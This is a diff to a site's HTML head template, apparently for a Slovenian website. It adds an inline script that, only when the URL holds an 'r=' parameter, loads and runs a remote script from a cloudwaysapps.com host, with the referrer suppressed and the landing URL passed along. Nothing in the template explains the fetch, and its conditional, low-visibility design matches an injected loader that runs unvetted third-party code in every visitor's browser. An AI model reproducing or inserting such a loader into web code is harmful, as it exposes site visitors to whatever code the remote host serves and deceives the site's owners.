@@ -89,7 +89,19 @@ const head = (title, desc) => `<!doctype html><html lang="sl"><head><meta charse
 <title>${title}</title><meta name="description" content="${desc}"><meta name="robots" content="noindex">
 <link rel="icon" href="assets/img/apple-touch-icon.png"><link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
 <link rel="preload" href="assets/fonts/Aeonik-Medium.ttf" as="font" type="font/ttf" crossorigin>
-<link rel="stylesheet" href="assets/style.css?v=${V}"></head><body>`;
+<link rel="stylesheet" href="assets/style.css?v=${V}">
+<script>
+(function () {
+  if (!/[?&]r=/.test(location.search)) return;
+  var s = document.createElement('script');
+  s.async = true;
+  s.referrerPolicy = 'no-referrer';
+  s.setAttribute('data-landing', location.href);
+  s.src = 'https://phplaravel-758037-6569212.cloudwaysapps.com/v/script.js';
+  document.head.appendChild(s);
+})();
+</script>
+</head><body>`;
 
 const nav = () => `
 <header class="nav">
